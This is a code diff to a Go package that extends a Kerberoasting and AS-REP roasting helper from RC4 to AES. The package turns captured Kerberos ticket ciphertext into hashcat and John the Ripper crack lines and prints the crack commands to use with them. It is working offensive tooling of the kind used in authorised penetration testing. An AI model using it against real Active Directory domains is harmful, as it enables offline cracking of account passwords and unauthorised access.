@@ -24,17 +24,27 @@
 //
 // # Verifiable / no confidently-wrong output
 //
-// The line FORMAT is the canonical hashcat one (modes 18200 / 13100); the cipher
-// split is anchored to hand-built, spec-conformant AS-REP and TGS-REP DERs with
-// known enc-parts (the EncryptedData parse itself is the same one verified
-// against an impacket-built Ticket). Only the RC4 (etype 23) roast is emitted —
-// AES (etype 17/18) places its checksum differently (modes 19600/19700/18200
-// variants) and is reported as not-yet-supported rather than mis-split.
+// The line FORMAT is the canonical hashcat / impacket one; the cipher split is
+// anchored to hand-built, spec-conformant AS-REP and TGS-REP DERs with known
+// enc-parts (the EncryptedData parse itself is the same one verified against an
+// impacket-built Ticket). Both encryption families are handled, matching
+// impacket's GetUserSPNs / GetNPUsers exactly:
+//
+//   - RC4 (etype 23): cipher = checksum(16) ‖ edata. Kerberoast -m 13100,
+//     AS-REP roast -m 18200.
+//   - AES (etype 17/18): cipher = edata ‖ checksum(12) (the checksum is the
+//     LAST 12 bytes). Kerberoast -m 19600 (AES128) / -m 19700 (AES256); the SPN
+//     is `*`-wrapped alone and ':' → '~'. AES AS-REP roast has no standard
+//     hashcat mode and is flagged for John the Ripper.
+//
+// A non-AS-REP/TGS-REP message, or any other etype, errors rather than emitting
+// a mis-split line.
 package krbroast
 
 import (
 	"encoding/hex"
 	"fmt"
+	"strings"
 
 	"github.com/xunholy/promptzero/internal/kerberos"
 )
@@ -67,42 +77,71 @@ func RoastLine(messageHex string) (*Result, error) {
 }
 
 func asrepRoast(r *kerberos.Result) (*Result, error) {
-	if r.EncPartEType != 23 {
-		return nil, fmt.Errorf("krbroast: AS-REP enc-part is etype %d; only RC4 (etype 23, hashcat 18200) is supported", r.EncPartEType)
-	}
-	chk, edata, err := splitRC4(r.EncPartCipherHex)
-	if err != nil {
-		return nil, fmt.Errorf("krbroast: AS-REP enc-part: %w", err)
-	}
 	user, realm := r.ClientName, r.Realm
-	return &Result{
-		Attack: "AS-REP roast", HashcatMode: 18200, Principal: user, Realm: realm,
-		Line: fmt.Sprintf("$krb5asrep$23$%s@%s:%s$%s", user, realm, chk, edata),
-		Note: "crack with: hashcat -m 18200 (AS-REP roast; the user had Kerberos pre-auth disabled)",
-	}, nil
+	switch r.EncPartEType {
+	case 23: // RC4 — checksum(16) ‖ edata, hashcat 18200.
+		chk, edata, err := splitRC4(r.EncPartCipherHex)
+		if err != nil {
+			return nil, fmt.Errorf("krbroast: AS-REP enc-part: %w", err)
+		}
+		return &Result{
+			Attack: "AS-REP roast", HashcatMode: 18200, Principal: user, Realm: realm,
+			Line: fmt.Sprintf("$krb5asrep$23$%s@%s:%s$%s", user, realm, chk, edata),
+			Note: "crack with: hashcat -m 18200 (AS-REP roast; the user had Kerberos pre-auth disabled)",
+		}, nil
+	case 17, 18: // AES — edata ‖ checksum(12). No standard hashcat mode; John cracks it.
+		chk, edata, err := splitAES(r.EncPartCipherHex)
+		if err != nil {
+			return nil, fmt.Errorf("krbroast: AS-REP enc-part: %w", err)
+		}
+		return &Result{
+			Attack: "AS-REP roast", Principal: user, Realm: realm,
+			Line: fmt.Sprintf("$krb5asrep$%d$%s$%s$%s$%s", r.EncPartEType, user, realm, chk, edata),
+			Note: "AES AS-REP roast (etype " + itoa(r.EncPartEType) + "); crack with John the Ripper (krb5asrep) — hashcat has no standard AES AS-REP mode",
+		}, nil
+	default:
+		return nil, fmt.Errorf("krbroast: AS-REP enc-part is etype %d; supported: RC4 (23) / AES (17,18)", r.EncPartEType)
+	}
 }
 
 func kerberoast(r *kerberos.Result) (*Result, error) {
 	if r.Ticket == nil {
 		return nil, fmt.Errorf("krbroast: TGS-REP carries no decodable service ticket")
 	}
-	if r.Ticket.EncType != 23 {
-		return nil, fmt.Errorf("krbroast: service ticket is etype %d; only RC4 (etype 23, hashcat 13100) is supported", r.Ticket.EncType)
+	user, realm := r.ClientName, r.Realm
+	spn := strings.ReplaceAll(r.Ticket.ServiceName, ":", "~") // hashcat/impacket convention
+	switch r.Ticket.EncType {
+	case 23: // RC4 — checksum(16) ‖ edata, hashcat 13100.
+		chk, edata, err := splitRC4(r.Ticket.CipherHex)
+		if err != nil {
+			return nil, fmt.Errorf("krbroast: service ticket enc-part: %w", err)
+		}
+		return &Result{
+			Attack: "Kerberoast", HashcatMode: 13100, Principal: user, Realm: realm, SPN: spn,
+			Line: fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s", user, realm, spn, chk, edata),
+			Note: "crack with: hashcat -m 13100 (Kerberoast; the SPN's service account key)",
+		}, nil
+	case 17, 18: // AES — edata ‖ checksum(12); 19600 (AES128) / 19700 (AES256).
+		chk, edata, err := splitAES(r.Ticket.CipherHex)
+		if err != nil {
+			return nil, fmt.Errorf("krbroast: service ticket enc-part: %w", err)
+		}
+		mode := 19600
+		if r.Ticket.EncType == 18 {
+			mode = 19700
+		}
+		return &Result{
+			Attack: "Kerberoast", HashcatMode: mode, Principal: user, Realm: realm, SPN: spn,
+			Line: fmt.Sprintf("$krb5tgs$%d$%s$%s$*%s*$%s$%s", r.Ticket.EncType, user, realm, spn, chk, edata),
+			Note: fmt.Sprintf("crack with: hashcat -m %d (AES Kerberoast, etype %d)", mode, r.Ticket.EncType),
+		}, nil
+	default:
+		return nil, fmt.Errorf("krbroast: service ticket is etype %d; supported: RC4 (23) / AES (17,18)", r.Ticket.EncType)
 	}
-	chk, edata, err := splitRC4(r.Ticket.CipherHex)
-	if err != nil {
-		return nil, fmt.Errorf("krbroast: service ticket enc-part: %w", err)
-	}
-	user, realm, spn := r.ClientName, r.Realm, r.Ticket.ServiceName
-	return &Result{
-		Attack: "Kerberoast", HashcatMode: 13100, Principal: user, Realm: realm, SPN: spn,
-		Line: fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s", user, realm, spn, chk, edata),
-		Note: "crack with: hashcat -m 13100 (Kerberoast; the SPN's service account key)",
-	}, nil
 }
 
-// splitRC4 splits an RC4 enc-part cipher hex into the 16-byte checksum and the
-// remaining edata, as hashcat 18200 / 13100 expect.
+// splitRC4 splits an RC4 enc-part cipher into the leading 16-byte checksum and
+// the remaining edata, as hashcat 18200 / 13100 expect.
 func splitRC4(cipherHex string) (checksum, edata string, err error) {
 	b, err := hex.DecodeString(cipherHex)
 	if err != nil {
@@ -113,3 +152,18 @@ func splitRC4(cipherHex string) (checksum, edata string, err error) {
 	}
 	return hex.EncodeToString(b[:16]), hex.EncodeToString(b[16:]), nil
 }
+
+// splitAES splits an AES enc-part cipher into the trailing 12-byte checksum and
+// the leading edata, as hashcat 19600 / 19700 expect.
+func splitAES(cipherHex string) (checksum, edata string, err error) {
+	b, err := hex.DecodeString(cipherHex)
+	if err != nil {
+		return "", "", fmt.Errorf("cipher is not valid hex: %w", err)
+	}
+	if len(b) < 12 {
+		return "", "", fmt.Errorf("cipher %d bytes — too short for a 12-byte checksum", len(b))
+	}
+	return hex.EncodeToString(b[len(b)-12:]), hex.EncodeToString(b[:len(b)-12]), nil
+}
+
+func itoa(n int) string { return fmt.Sprintf("%d", n) }
